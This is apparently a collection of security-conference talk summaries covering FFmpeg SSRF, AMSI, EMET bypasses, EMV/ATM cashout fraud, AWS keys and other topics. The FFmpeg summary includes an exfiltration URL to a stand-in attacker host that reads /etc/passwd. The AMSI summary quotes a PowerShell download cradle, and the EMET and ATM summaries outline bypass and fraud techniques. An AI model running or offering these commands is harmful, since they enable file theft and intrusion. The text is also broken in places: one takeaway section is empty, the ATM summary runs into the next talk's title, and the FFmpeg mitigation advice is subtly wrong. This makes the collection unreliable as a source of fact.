talks.title: Viral Video
talks.teaser: Analysts investigate attack surfaces and defenses concerning Viral Video - Exploiting SSRF in Video Converters.
talks.summary:
Overview:
Maxim Andreev and Nikolai Ermishkin of Mail.ru present "Viral Video," uncovering critical Server-Side Request Forgery (SSRF) and arbitrary local file read vulnerabilities in online video conversion services powered by FFmpeg. Video platforms routinely process uploaded media files through backend FFmpeg pipelines to generate multiple resolutions, formats, and thumbnails. The researchers demonstrate how abusing obscure FFmpeg features—specifically Apple HTTP Live Streaming (HLS) playlist parsing, the virtual concat protocol, and uncompressed raw video demuxers—enables attackers to exfiltrate sensitive local files and breach internal cloud infrastructure across major web platforms including Yandex, Flickr, and Imgur.

Key Topics:
- Architecture of automated server-side video conversion and thumbnailing pipelines using FFmpeg
- Server-Side Request Forgery (SSRF) exploitation via Apple HTTP Live Streaming (HLS) playlists
- Local file disclosure using FFmpeg's concat protocol and raw video demuxers (YUV4MPEG2)
- Real-world bug bounty exploitation case studies: Compromising Yandex, Flickr (Yahoo), and Imgur

Technical Details:
Online video hosting platforms, social networks, and cloud storage providers process millions of user-uploaded videos daily. To ensure playback compatibility across varied mobile devices and network conditions, backend servers pass uploaded files into automated processing pipelines powered by FFmpeg. FFmpeg is a massive, complex multimedia framework comprising dozens of demuxers, decoders, and protocol handlers. By default, FFmpeg determines file types via content sniffing rather than file extensions, meaning an attacker can upload arbitrary multimedia script formats disguised with standard extensions like .mp4. Furthermore, FFmpeg treats plain text files (.txt) as valid video sources, automatically rendering lines of text into visual video frames.

The authors leveraged these capabilities to construct several novel exploitation primitives. First, they weaponized Apple HTTP Live Streaming (HLS), an adaptive streaming standard that utilizes .m3u8 playlist files containing links to segmented media chunks. By uploading a crafted .m3u8 playlist disguised as an .mp4, the attacker directs FFmpeg to fetch video segments from internal network URLs or cloud metadata services (e.g., http://169.254.169.254/latest/meta-data/). By appending .txt to the request URI, FFmpeg parses the returned HTTP response as a text-based video script, rendering the internal server's response body directly into output video frames and achieving bidirectional SSRF.

Second, the speakers exploited FFmpeg's internal concat protocol, which seamlessly chains multiple media sources together. By constructing an input URL such as concat:http://attacker.com/header|file:///etc/passwd, FFmpeg concatenates the remote web header with the local system file, appending the first line of /etc/passwd directly into the outbound HTTP request query string. To extract entire multi-line files, the authors utilized the uncompressed YUV4MPEG2 video format. By concatenating a minimal YUV header with local files and instructing FFmpeg to generate a PNG thumbnail, the target file's raw binary data was encoded into the thumbnail's pixel data. Downloading and re-converting the thumbnail completely reconstructed the original local file. The authors proved the real-world impact of these techniques by compromising major platforms, including Yandex Cloud Storage, Flickr (Yahoo), and Imgur.

Key Takeaways:
Automated media processing pipelines represent high-risk attack surfaces due to the expansive format and protocol parsing capabilities embedded within tools like FFmpeg. Web services must never pass untrusted user uploads into FFmpeg without disabling internal network protocols and external playlist fetching (-protocol_whitelist file,crypto or -nostdin). Security architectures should isolate video conversion workers inside network-restricted, non-privileged containers lacking access to cloud metadata endpoints or internal private networks.

talks.title: AMSI: How Windows 10 Plans to Stop Script-Based Attacks and How Well It Does It
talks.teaser: Analysts investigate attack surfaces and defenses concerning AMSI: How Windows 10 Plans to Stop Script-Based Attacks and How Well It Does It.
talks.summary:
Overview:
Nikhil Mittal, creator of the Nishang and Kautilya penetration testing toolkits, analyzes the Antimalware Scan Interface (AMSI) introduced in Windows 10. The presentation examines the rise of memory-resident script-based attacks targeting PowerShell, VBScript, and JScript. The speaker evaluates AMSI's architecture, its real-time detection capabilities, and various methodologies attackers explore to evade, bypass, or neutralize in-memory script scanning.

Key Topics:
- Attacker preference for PowerShell in post-exploitation and living-off-the-land techniques
- Execution vectors: Disk execution versus in-memory cradles (Base64 -EncodedCommand, DownloadString)
- Architectural purpose and interception mechanics of Windows 10 AMSI
- Memory-resident scanning capabilities: Buffer inspection, stream analysis, and reputation checks

Technical Details:
Script-based attacks—specifically those leveraging PowerShell—have become the preferred post-exploitation mechanism on Windows operating systems. Attackers favor PowerShell due to its native presence on all Windows versions from Vista onward, low detection rates compared to compiled binary executables, and extensive administrative capabilities across Windows Management Instrumentation (WMI), .NET classes, COM objects, the registry, and PowerShell Remoting. Furthermore, because system administrators rely heavily on PowerShell for enterprise operations, malicious scripts easily blend into routine administrative network traffic.

Historically, attackers avoided disk-based script execution to evade conventional antivirus file scanners. Instead, offensive operations leveraged memory-only execution primitives, including Base64-encoded commands via the -EncodedCommand switch, .NET dynamic reflection, and remote download cradles like DownloadString (IEX (New-Object Net.WebClient).DownloadString(...)). The widespread abuse of DownloadString to fetch and execute payloads directly within memory without touching physical storage spurred Microsoft to engineer a dedicated defensive interface: the Antimalware Scan Interface (AMSI).

AMSI operates as a standardized interface integrating application runtimes (such as PowerShell, Windows Script Host, and Office VBA) directly with installed antivirus and endpoint detection engines. When a script executes, the hosting runtime passes the unencrypted, de-obfuscated script content directly from memory to AMSI before interpretation. AMSI conducts in-memory buffer analysis, stream scanning, and content reputation checks against known signatures and malicious patterns. The author investigates AMSI's operational footprint, documenting how researchers experiment with bypassing the interface through memory patching, unloading scan providers, and obfuscation variations to restore unhindered in-memory execution.

Key Takeaways:
AMSI provides critical visibility into previously invisible in-memory script execution, neutralizing legacy download cradles that rely solely on Base64 encoding or dynamic concatenation. System administrators should configure comprehensive PowerShell Script Block Logging (Event ID 4104) and Constrained Language Mode to complement AMSI defenses. Defensive teams must monitor memory-space integrity to detect unauthorized patching of amsi.dll or hook-tampering attempts designed to disable scan engines within running processes.

talks.title: Towards a Holistic Approach in Building Intelligence to Fight Crimeware
talks.teaser: Industry experts analyze emerging threats surrounding Towards a Holistic Approach in Building Intelligence to Fight Crimeware.
talks.summary:
## Overview

Researchers from OpenDNS, Intel 471, and other organizations present a comprehensive methodology for fighting cybercrime by dismantling the infrastructure that enables it. Three speakers discuss complementary research approaches: Dia Maubning (technical leader in network/algorithm research), Misha Sakali (Intel 471 threat intelligence researcher tracking Russian-speaking actors), and Thomas Matthew (OpenDNS machine learning and graph analytics researcher). The core insight is that underground cybercrime operates as a structured ecosystem, and understanding both the technical infrastructure and the human actors behind it enables effective defense and disruption.

## Cybercrime Ecosystem Structure

The underground economy operates through three market segments. Products include malware, remote access trojans (RATs), brute-forcing tools, banking trojans, and exploits traded in criminal forums. Services are critical force multipliers—DDoS, exploit kits, ransomware-as-a-service, and attack-delivery mechanisms enable actors to scale campaigns across victims at industrial scale. Goods represent immediately consumable commodities: stolen database dumps, compromised credit card numbers, and ready-to-use credentials for account takeover. Bulletproof hosting (BPH) providers are the foundational infrastructure enabling most criminal operations—they provide resilience against law enforcement and services specifically designed for criminal operations.

## Network-Centric Research: Infrastructure Artifacts

The first methodology uses infrastructure data to identify BPH providers. Data sources include DNS records, IP addresses, BGP announcements, WHOIS data, and SSL certificates. Researchers track malicious domains hosting exploit kits, ransomware, C2 servers, and phishing infrastructure, then pivot from those domains to underlying IP space to identify ranges used for criminal operations. IP space monitoring tracks BGP announcements across ASNs, revealing evasion techniques used by sophisticated operators. A novel contribution uses SSL certificates as infrastructure fingerprints: bulletproof hosters encrypt traffic with SSL to hide operations and signal sophistication. X.509 certificates contain issuer and subject information; analyzing common names and organization fields across IP ranges groups individuals sharing certificates and reveals network structures. Self-signed certificates (typical for criminal infrastructure) and valid certificates with trust chains both provide investigative value.

## Actor-Centric Research: Undercover Infiltration

Intel 471's approach inverts traditional malware analysis, starting with actors and tracing their activities. This requires persistent infiltration of underground cybercrime forums and marketplaces where actors trade goods, build reputations through feedback, and conduct business. Personnel must possess cultural knowledge and language capabilities—particularly Russian for Eastern European actors—to maintain operational personas online. Critically, purchasing actual services from BPH providers enables collection of specific operational indicators (IP addresses, domains, ASNs) otherwise hidden. This grounds research in actual criminal practices rather than theoretical analysis.

## Takeaways

Effective crimeware defense requires combining multiple data sources and methodologies. Network-centric approaches using SSL certificates, BGP data, and infrastructure pivoting provide scalable reconnaissance. Actor-centric approaches through undercover forum participation provide ground truth and operational indicators. Together, these methodologies create comprehensive intelligence on how criminal infrastructure is built, maintained, and defended against law enforcement. Organizations defending against cybercrime must understand both technical infrastructure layers and the human/economic layers where actors operate and build reputations.

talks.title: AVLeak: Fingerprinting Antivirus Emulators for Advanced Malware Evasion
talks.teaser: Industry experts analyze emerging threats surrounding AVLeak: Fingerprinting Antivirus Emulators for Advanced Malware Evasion.
talks.summary:
Overview:
Alex Bazelle, presenting joint research conducted with Jeremy Blackthorne and Dr. Bülent Yener at Rensselaer Polytechnic Institute (RPI), introduces AVLeak, a tool designed to fingerprint consumer antivirus emulators. The talk examines how the failure of static signature detection led security vendors to adopt dynamic emulation for binary analysis. The author demonstrates an automated multi-byte exfiltration side-channel that extracts internal emulator artifacts within hours, enabling malware developers to construct highly evasive binaries.

Key Topics:
- Decline of static signatures and industry transition to dynamic antivirus emulation
- Architecture of consumer AV emulators: x86 instruction engines and Win32 API stubs
- Six core categories of emulator fingerprints (strings, API behaviors, timing skews, CPU red pills)
- AVLeak side-channel architecture: Mapping arbitrary byte ranges to known malware signatures

Technical Details:
Faced with over one million new malware samples per day, commercial antivirus vendors transitioned from static signature scanning to dynamic behavioral analysis. Modern consumer AV engines execute suspicious binaries inside lightweight emulators containing an x86 instruction stepping engine paired with a user-mode Windows API emulator. When a binary invokes operating system APIs (such as GetComputerName or GetUserName), the emulator intercepts the call and supplies fabricated, hardcoded responses to observe whether the executable unpacks malicious code or exhibits suspicious behavior. In response, evasive malware searches for environmental artifacts ("fingerprints") to detect the emulation boundary and terminate execution benignly.

The researchers categorize emulator detection vectors into six technical tiers: hardcoded environment strings, inaccurate Windows API emulation, broken network emulation, timing skews (inherent CPU clock discrepancies), process self-introspection (inspecting process headers or registers), and CPU "red pills" (subtle execution deviations between real x86 silicon and emulated microcode). While prior academic approaches to discovering these fingerprints relied either on tedious manual reverse engineering or slow 1-bit blackbox oracle tests (which drop a single malware sample based on a boolean query, leaking only one bit per scan), the authors designed AVLeak to automate rapid data extraction.

Implemented in C and Python, AVLeak establishes a high-throughput multi-byte exfiltration side-channel. The tool maps individual byte values across the full range from 0x00 to 0xFF to distinct, identifiable malware signatures (e.g., mapping specific bytes to signatures like Morris, Code Red, or Zeus). By dynamically evaluating emulator memory or API return values and triggering the corresponding malware signature in its execution report, AVLeak extracts multi-byte strings and internal data structures directly from the AV vendor's analysis report. This technique allows researchers to map internal emulator behaviors and extract comprehensive fingerprint profiles within hours.

Key Takeaways:
Consumer antivirus emulators contain pervasive implementation inaccuracies, hardcoded string responses, and timing artifacts that allow malware to evade dynamic analysis. Security vendors must move away from static, synthetic API responses and develop high-fidelity emulation environments that mirror real-world operating system behaviors. Defenders must recognize that client-side dynamic pre-execution scanning is inherently vulnerable to side-channel fingerprinting and must be backed by continuous post-execution behavioral monitoring.

talks.title: Using EMET to Disable EMET
talks.teaser: Industry experts analyze emerging threats surrounding Using EMET to Disable EMET.
talks.summary:
## Overview

Presented at Black Hat by Abdullah Al-Sahil (Mandiant/FireEye Saudi Arabia) and Raghav Pande (FireEye Bangalore), this talk analyzes the mechanics of Microsoft’s Enhanced Mitigation Experience Toolkit (EMET) and evaluates techniques used to evade or disable its exploit mitigations. EMET acts as an anti-exploit system designed to raise the cost of exploitation rather than prevent it entirely. It enforces userland mitigations—such as SEHOP, DEP, ASLR, bottom-up ASLR, null page allocation blocking, heap spray prevention, and anti-detours—by injecting its DLL into protected processes, manipulating debug registers, installing custom exception handlers, and implementing inline hooks on critical Windows APIs (including low-level functions in `ntdll.dll`).

## Historical EMET Disabling Techniques

The speakers reviewed historical techniques (largely documented by Offensive Security and tested across versions 2.1 through 5.1) that neutralized EMET entirely by manipulating internal configuration flags or hardware registers:

* **EMET 2.1 & 4.1:** A global variable was maintained in a writable data section within the EMET DLL. Every mitigation check referenced this flag; writing `0` directly deactivated EMET's protections.
* **EMET 5.0:** The global flag was relocated to a large heap-allocated configuration structure (`CONFIG_STRUCT`), referenced by a pointer at a static offset in the DLL. Overwriting this flag similarly deactivated protections.
* **EMET 5.1:** Microsoft moved the configuration structure to read-only memory. Attackers bypassed this by locating an unhooked pointer to `NtProtectVirtualMemory`, reprogramming the memory page to writable, and modifying the flag.
* **Disabling Export Address Table Access Filtering (EAF):** Because EAF detects shellcode (e.g., Metasploit payloads inspecting the EAT of `kernel32`, `kernelbase`, or `ntdll`) by placing hardware breakpoints via debug registers (`DR0`–`DR3`), disabling it required clearing those registers. This was accomplished by initializing a zeroed `CONTEXT` structure and applying it to the active thread via an unhooked pointer to `NtSetContextThread`.

## Specific Mitigation Bypass & Evasion Techniques

Rather than disabling the engine globally, attackers often bypass individual mitigation checks that intercept Return-Oriented Programming (ROP) chains:

### Stack Pivot
EMET validates whether the stack pointer (`ESP`) stays within the upper and lower thread stack limits defined in the Thread Environment Block (TEB). Attackers evade this check through two primary methods:
* **Stack Switching:** Gadgets are executed by pushing instructions onto the genuine stack, temporarily negating/restoring the stack pointer using register exchanges (`XCHG`), and executing API calls from the legitimate thread stack boundaries.
* **Custom Classes / JIT Arguments (Operation Wolf):** Observed in the wild using Flash vector objects for arbitrary memory read/write, attackers constructed a custom class with a virtual function taking numerous arguments populated with ROP gadgets. Upon JIT compilation, arguments were placed directly on the authentic stack. Attackers overwrote the function pointer and used an stack adjustment gadget (e.g., `add esp, 0x58`) to slide `ESP` straight into the parameters on the real stack, completely bypassing stack pivot checks during subsequent API calls.

### Caller Check
EMET inspects the return address of hooked APIs to ensure the caller was reached via an authentic `CALL` instruction pointing directly to the target API, rather than a `RET` or `JMP` instruction. Exploit writers circumvent this by locating valid call gadgets (e.g., a `CALL <reg>; RET` sequence loaded with the target address of an API such as `VirtualProtect`) to simulate legitimate call flow before redirecting execution into shellcode.

talks.title: Secure Penetration Testing Operations: Demonstrated Weaknesses in Learning Material and Tools
talks.teaser: Engineers explore architecture and security mechanisms for Secure Penetration Testing Operations: Demonstrated Weaknesses in Learning Material and Tools.
talks.summary:
Overview:
Wesley McGrew, Director of Cyber Operations at Horne Cyber and adjunct faculty at Mississippi State University, delivers an introspective analysis of operational security deficiencies in penetration testing. The presentation investigates how security training curricula, industry reference books, and standard tools encourage insecure habits that put both clients and testers at risk. The speaker demonstrates real-world exploit interception, showing how third-party adversaries can hijack active penetration testing sessions directly over the network.

Key Topics:
- Operational security (OPSEC) vulnerabilities during commercial penetration testing engagements
- Threat modeling the third-party attacker targeting clients and penetration testers
- Systemic flaws in industry training materials, textbooks, and certification programs
- Network session hijacking demonstration against unencrypted Meterpreter payloads

Technical Details:
Commercial penetration testing remains an operationally immature discipline characterized by widespread operational security failures. Both the client organization undergoing testing and the penetration testing team itself represent exceptionally attractive, soft targets for third-party adversaries and state-sponsored groups. When a security assessment is conducted, testers often deploy physical dropboxes, establish remote pivot points, and execute active exploits across client networks. If these activities are conducted without rigorous operational hygiene, third-party attackers monitoring the network can compromise testing infrastructure or extract sensitive client intelligence.

The root cause of these widespread operational failures stems from foundational training and reference materials. Evaluating industry textbooks, SANS courseware, and certification frameworks reveals that educational curricula consistently prioritize classroom convenience over operational security. Training environments routinely instruct students to deploy unencrypted command-and-control channels, utilize default credentials, expose open listener ports on public interfaces, and execute noisy, forensic-heavy exploitation scripts. Because junior testers and seasoned practitioners alike adopt these classroom habits on live customer networks, commercial engagements frequently operate with minimal encryption and zero payload authentication.

The author contextualizes this research within his broader project series, building on previous presentations on hardware dropboxes ("Pwn the Pwn Plug" at DEF CON 21) and default tool configurations ("I Hunt Penetration Testers" at DEF CON 23). To demonstrate the practical risk of insecure testing practices, the speaker executes a live proof-of-concept showing how an unauthenticated third party positioned on the local network can intercept and hijack active Metasploit Meterpreter sessions off the wire. By exploiting unencrypted or weakly authenticated reverse TCP handlers, an outside adversary takes control of the established shell, gaining immediate administrative access to the client's internal network via the penetration tester's own infrastructure.

Key Takeaways:

talks.title: Access Keys Will Kill You Before You Kill the Password
talks.teaser: Analysts investigate attack surfaces and defenses concerning Access Keys Will Kill You Before You Kill the Password.
talks.summary:
## Overview

Lee Simon, principal security engineer at NCC Group, discusses why access keys pose a greater security risk than passwords in AWS environments. This presentation compares AWS authentication methods and presents hardening solutions, including demonstrations of Scout 2 (an AWS configuration review tool) and AWS recipes (a repository of tools, policies, and security configurations). The core argument: AWS passwords benefit from MFA enforcement during console login, but access keys—used for programmatic API access—have no MFA requirement, making them the critical vulnerability in AWS infrastructure security.

## AWS Security Model: Cloud vs On-Premises

Unlike traditional data centers with physical security controls (guards, fencing, badges, biometric readers), cloud security relies entirely on credential-based access. Once authenticated to AWS, a single set of credentials grants access to all infrastructure: web consoles, databases, application servers, firewalls, logging and monitoring systems. This fundamental architectural difference means credential compromise has exponentially higher impact in cloud environments. Authentication occurs through two distinct services: Identity and Access Management (IAM), which manages users, groups, and access control policies; and Security Token Service (STS), which issues time-limited temporary credentials with explicit scope.

## Password vs Access Key Security Analysis

A detailed comparison reveals critical gaps in access key security. Passwords benefit from MFA enforcement during console login, but access keys present multiple weaknesses: (1) they're stored in plaintext configuration files because SDK design requires it; (2) they appear frequently in source code repositories and developer laptops; (3) rotation is not enforced or easily available; (4) they're never subject to password policies like complexity requirements; (5) most critically, MFA is not enforced when using access keys programmatically. While AWS generates unique random access keys, the consumption model creates persistent exposure. Most security-conscious AWS administrators maintain strong password practices and enable MFA, but treat access keys as freely distributable credentials despite their far superior attack surface.

## MFA Implementation Strategy

MFA is available for AWS but requires deliberate implementation strategy. For password-based console authentication, enabling MFA forces an MFA prompt at login, but users can delete the MFA device from their account configuration to bypass protection. For access key-based API authentication, MFA enforcement requires creating IAM policies that deny all API actions unless an MFA-authenticated token is present. Policies can prevent users from deleting MFA devices and block all API calls without valid MFA credentials. The Secure Token Service (STS) issues temporary credentials valid 15 minutes to hours when provided with MFA codes, enabling time-limited access with explicitly scoped privileges compared to permanent access keys. This approach eliminates the long-lived credential exposure.

## Takeaways

Access keys represent the critical vulnerability in AWS security, despite being easier to distribute than passwords. Organizations should require MFA for all employees regardless of authentication method (console or API). For console access, this means enabling MFA and preventing removal. For API/programmatic access, implement IAM policies enforcing MFA-based temporary credentials via STS with limited validity and scoped privileges. This two-tier approach addresses the fundamental asymmetry where administrators maintain strong password practices but leave access keys as unprotected vectors for attackers.

talks.title: Cyber War in Perspective: Analysis From the Crisis in Ukraine
talks.teaser: Industry experts analyze emerging threats surrounding Cyber War in Perspective: Analysis From the Crisis in Ukraine.
talks.summary:
Overview:
Kenneth Geers, Senior Fellow at the Atlantic Council and former US Army signals intelligence specialist, examines the cyber warfare dimensions of the conflict in Ukraine. Drawing from two years living in Ukraine and his historical work establishing the NATO Cooperative Cyber Defence Centre of Excellence (CCDCOE) in Estonia, the speaker analyzes the fusion of kinetic operations, information warfare, and network sabotage. The presentation explores international norms, military doctrine, and the formal recognition of cyberspace as an operational domain of warfare.

Key Topics:
- Geopolitical context of the crisis in Ukraine and the integration of cyber operations into modern warfare
- Tactical information operations: Geotargeted SMS campaigns targeting civilian protesters during Maidan
- Evolution of NATO doctrine: The 2016 Warsaw Summit Communiqué declaring cyberspace a domain of war
- US military operational frameworks: Field Manual FM 3-38 (Cyber Electromagnetic Activities) and historical SIGINT

Technical Details:
The crisis in Ukraine illustrates the convergence of conventional military force, cyber operations, and strategic information warfare. The speaker highlights how personal smartphones carried by citizens and combatants function as distributed supercomputers susceptible to three primary cyber attack modalities: unauthorized data collection, denial-of-service, and data alteration. During the Euromaidan protests, operators conducted precise, location-targeted cellular operations, dispatching localized SMS intimidation messages (such as warning recipients that they were approaching the presidential palace) based on real-time cell tower triangulation.

The geopolitical significance of Ukraine—described by Russian leadership as foundational to Russian history—spurred the deployment of advanced cyber capabilities alongside physical military operations. Geers connects these operations to the founding of the NATO CCDCOE in Tallinn following the 2007 cyber attacks against Estonian infrastructure. A critical milestone occurred at the July 2016 NATO Summit in Warsaw, where the alliance officially recognized cyberspace as an operational domain of warfare on par with land, sea, and air, establishing that severe cyber attacks could trigger an Article 5 collective defense response.

To analyze military cyber doctrine, the author reviews US Army Field Manual FM 3-38 (Cyber Electromagnetic Activities, 2014). The doctrine defines cyberspace operations as instruments to project power against military adversaries and digital personas, acknowledging that military cyber operations must inevitably traverse civilian infrastructure, creating collateral risks for public utilities, schools, and hospitals. Geers emphasizes that computer network operations do not operate in a vacuum; rather, they reflect continuous geopolitical intelligence priorities, echoing historical Soviet signals intelligence achievements such as "The Thing" (the Great Seal passive resonant cavity transmitter gifted to the US Ambassador in Moscow in 1945). Modern cyber warfare combines human intelligence, electronic warfare, and network exploitation into integrated statecraft.

Key Takeaways:
Modern military conflicts will consistently integrate cyber operations with kinetic forces, targeting critical infrastructure and civilian communication networks to achieve tactical and psychological objectives. International alliances and national defense strategies must establish clear normative boundaries and rules of engagement for state conduct in cyberspace. Cybersecurity professionals must understand that network defense extends beyond enterprise risk into national security, as critical infrastructure systems serve as battlegrounds during geopolitical conflicts.

talks.title: Side-Channel Attacks on Everyday Applications
talks.teaser: Security researchers examine technical aspects of Side-Channel Attacks on Everyday Applications.
talks.summary:
## Overview

Tyler Hornby presents a comprehensive exploration of side-channel attacks that extend beyond cryptographic key extraction to target user privacy in everyday applications. The talk begins with historical context—power analysis on RSA smart cards, timing leaks in VoIP encryption, and acoustic cryptanalysis of laptops—before pivoting to "cryptography-less" side-channel attacks that directly compromise user behavior and sensitive information. Hornby demonstrates a novel input-distinguishing attack on the Links command-line web browser to illustrate how modern systems remain vulnerable to cache-based information leakage, even when running unprivileged code.

## Cryptographic vs. Non-Cryptographic Side Channels

Traditional side-channel research targets cryptographic implementations (RSA exponentiation patterns, ECDSA signature timing, AES table lookups) where key material is small and catastrophic if leaked. However, recent research has shifted focus to direct privacy breaches without cryptographic targets. Examples include acoustic attacks on matrix printer keystroke sounds (allowing document content reconstruction), and Android cache side-channels that let unprivileged apps distinguish between tap and swipe gestures in other applications—enabling an unprivileged calculator app to infer user behavior in banking apps. Hornby emphasizes that these attacks don't require defeating cryptography, only measuring timing and resource contention in shared hardware.

## The Flush+Reload Technique

The attack leverages flush+reload, a cache side-channel discovered in 2013-2014 that proved remarkably powerful: it broke GPG's RSA implementation from a single decryption observation (prior cache attacks required hundreds or thousands of observations), and extracted ECDSA keys from watching one signature. Flush+reload has inspired follow-up research using the same technique to count shopping cart items on e-commerce sites across virtual machines, implement cross-user keyloggers on PCs (measuring keystroke timing to infer which keys were pressed), and distinguish user input based on cache state changes.

## Shared Memory and Cache as Side Channels

The technical foundation relies on memory architecture design. When multiple users run the same program (e.g., a web browser), the OS maps their virtual address spaces to the same physical memory pages (read-only code sections) to save resources. This creates a shared cache: if Alice's browser loads a code path (e.g., handling clicks on Wikipedia pages), those memory lines enter the CPU cache. When Scarlet (an unprivileged attacker with SSH access to Alice's machine) accesses the same code addresses, she observes cache-hit timing (fast) vs. cache-miss timing (slow), revealing which code Alice's browser executed. By monitoring cache patterns while Alice visits one of several known Wikipedia pages, Scarlet can infer which page (strep throat, ear infection, or chickenpox information) Alice accessed—compromising privacy without cryptographic attack.

## Takeaways

Side-channel attacks represent a fundamental architectural vulnerability that transcends cryptography. Modern systems treat shared CPU cache as trusted, assuming read-only memory pages cannot leak information. This assumption is broken: timing measurements alone can infer which code paths were executed, which pages were accessed, and which gestures users performed. The Links browser attack exemplifies how everyday applications—not just cryptographic libraries—are vulnerable to information disclosure from unprivileged code. Organizations must recognize that hardware-level resource contention (cache, memory bus, branch prediction) remains exploitable for privacy violations, and that mitigations require architectural changes beyond software patching.

talks.title: Security Through Design - Making Security Better By Designing for People
talks.teaser: Presenters detail vulnerability discovery and exploitation in Security Through Design - Making Security Better By Designing for People.
talks.summary:
Overview:
Jelle Niemantsverdriet, an incident response and digital forensics veteran, delivers a presentation critiquing traditional cybersecurity methodologies and advocating for human-centered design. The talk challenges the widespread industry perception that "humans are the weakest link," demonstrating that human error is typically a symptom of poorly designed, overly complex technical systems. The author outlines actionable design thinking methodologies, emphasizing user empathy, cognitive offloading, and rapid prototyping to create effective security solutions.

Key Topics:
- Deconstructing the "human error" fallacy in complex systems and incident response
- The "desire trails" analogy: User workflows versus rigid security obstructionism
- Cognitive offloading: Applying aviation-style operational checklists to complex technical administration
- Design thinking and human-centered design principles (empathy, problem definition, and prototyping)

Technical Details:
Drawing on more than a decade of experience in digital forensics and incident response, the speaker critiques the prevailing infosec culture that blames end users for security failures, exemplified by tropes like "there is no patch for human stupidity." Scientific research into failure within complex systems demonstrates that attributing an adverse incident to human error represents an incomplete investigation. Human error is an observable symptom rather than an underlying root cause; catastrophic failures almost invariably stem from systemic design flaws, ambiguous operational environments, and poorly conceived tools that force users into unsafe workarounds.

To illustrate human behavior in restrictive environments, the author uses the concept of "desire trails"—the visible dirt paths worn across grassy parks where pedestrians bypass circuitous paved sidewalks to reach their destination efficiently. Traditional cybersecurity responds to desire trails with obstructionism: erecting warning signs, taller fences, surveillance cameras, and perimeter controls that say "no" to user workflows. This adversarial approach alienates employees, drives operational tasks into shadow IT, and encourages organizations to stack disconnected security tools into fragile "InfoSec Jenga towers" without evaluating whether legacy policies remain effective.

The speaker proposes two technical methodologies to bridge this operational divide. First, for skilled operators managing high-stress, complex technical environments, organizations should adopt aviation-style checklists. Unlike compliance-driven audit checklists, well-engineered operational checklists allow operators to offload cognitive load during critical procedures, preventing omissions under pressure. Second, for broader enterprise security, teams must implement design thinking (human-centered design), popularized by IDEO and the Harvard Business Review. This framework requires security practitioners to engage directly with users in their daily workflows, develop empathy for operational constraints, redefine security requirements around human tasks, and build lightweight, iterative prototypes (analogous to Lean Startup MVPs) that facilitate productivity while enforcing safety.

Key Takeaways:
Security architects must treat user workarounds and errors as diagnostic indicators of flawed system design rather than user defiance. Enterprise security policies must facilitate rather than block business objectives, aligning controls with natural user workflows to prevent the creation of shadow IT desire trails. Security teams should implement cognitive offloading tools like operational checklists for technical administrators and adopt human-centered design frameworks to iteratively test security controls with end users.

talks.title: Hacking Next-Gen ATMs: From Capture to Cashout
talks.teaser: Industry experts analyze emerging threats surrounding Hacking Next-Gen ATMs: From Capture to Cashout.
talks.summary:
## Overview

At Black Hat / DEF CON, Weston Hecker, a senior security engineer and penetration tester at Rapid7, presented research on attacks targeting next-generation EMV (chip-and-PIN / chip-and-choice) payment architectures and automated ATM cashouts. As card liability shifts (such as those approaching in 2017 for ATMs and gas pumps) force the phaseout of traditional magnetic stripe "low-hanging fruit," criminals will need to adapt. Because EMV relies on dynamic authentication that prevents static replay of card data, Hecker analyzed and demonstrated how adversaries will likely transition from selling static Track 2 dumps to operating real-time, relayed fraud networks. The project involved roughly 400 hours of research, reading a 1,400-page EMV specification manual, purchasing an ATM, and developing custom banking backend and credit processor simulations.

---

## The Next-Gen Carding Economy: Real-Time Fraud Tunnels

Traditional carding sites trade static Track 1, 2, and 3 data (typically sold for around $12.50 per record). However, since EMV dynamic authentication data cannot simply be saved and used later, Hecker modeled what future carding platforms must look like to monetize compromised chip transactions:

* **VPN Tunnels Over Static Records:** Rather than buying card dumps, attackers purchase scheduled access to real-time sessions connected directly to compromised Point of Sale (POS) terminals containing "shimmers" (thin shimming devices inserted into card slots).
* **Blockchain-Scheduled Time Slots:** The backend distributes intercepted sessions in a blockchain structure, assigning specific time blocks to attackers. Criminals select their geographic region and cashout device type, receive connection credentials (such as DES keys and delimiting characters), and initiate a GRE tunnel to the fraud network prior to their allocated cashout window.
* **Mule Infrastructure and Capacity Sharing:** The infrastructure accommodates leased gear deployed by money mules, independent breaches, and federated carding rings, allowing smaller sites with unused transactions to pass capacity to larger networks.

---

## EMV Shimming and Relay Cashout Mechanics

Hecker demonstrated the mechanics of intercepting live chip data and relaying it to an ATM for cash extraction:

* **Live Data Interception:** Physical shimming devices embedded inside remote EMV POS terminals intercept live card traffic as legitimate users initiate transactions. These shimmers capture chip communications, PIN entries, and card flags over unencrypted internal communication channels.
* **Pre-Filtering and Profiling:** The relay system inspects EMV card flags during the initial handshake. Cards restricted to specific use cases (such as fuel-only fleet cards) are rejected automatically. Using Bank Identification Numbers (BINs—the first six digits of the card), the system infers account prestige and assumed ATM cash withdrawal limits (e.g., distinguishing between a $500 limit and a $3,000 limit).
* **Real-Time ATM Relay:** Because dynamic EMV transactions cannot be stored and replayed later, transactions must be relayed in real time. talks.title: Demystifying the Secure Enclave Processor
talks.teaser: Industry experts analyze emerging threats surrounding Demystifying the Secure Enclave Processor.
talks.summary:
Overview:
Security researchers Matthew Solnik, David Wang, and Tarjei Mandt present a technical reverse engineering analysis of Apple's Secure Enclave Processor (SEP). First integrated into the Apple A7 System-on-Chip (SoC) on the iPhone 5S, the SEP provides hardware-isolated cryptographic services and biometric processing. The presentation reveals the internal hardware architecture of the SEP, its dedicated memory filtering mechanisms, the multi-stage boot sequence, and the transparent inline AES-256 memory encryption protecting external RAM.

Key Topics:
- SEP hardware architecture: Dedicated 32-bit ARMv7-A "Kingfisher" core and isolated silicon peripherals
- Shared SoC infrastructure: Power manager, PLL clocking, shared RAM, and the Secure Mailbox
- Multi-stage bootstrapping: 4KB internal SRAM, ROM-based LPAE page tables, and TZ0/TZ1 memory regions
- Memory bus protection: Hardware-enforced one-way filtering and inline AES-256 XEX memory encryption

Technical Details:
Introduced with the 64-bit Apple A7 processor, the Secure Enclave Processor (SEP) is a specialized security subsystem designed to safeguard sensitive cryptographic keys, process Touch ID biometric templates, and execute an independent operating system (SEPOS). The SEP executes on a proprietary 32-bit ARMv7-A "Kingfisher" core running at approximately 300 to 400 MHz. It is physically segregated from the main Application Processor (AP); compromising the AP—even at the highest exception level (EL3)—provides zero direct access to the SEP core. The SEP features dedicated silicon peripherals, including a dedicated Boot ROM, a cryptographic engine, a true random number generator (TRNG), unique fused silicon keys (UID and GID), and dedicated GPIO lines routing directly to the Touch ID sensor without traversing the AP.

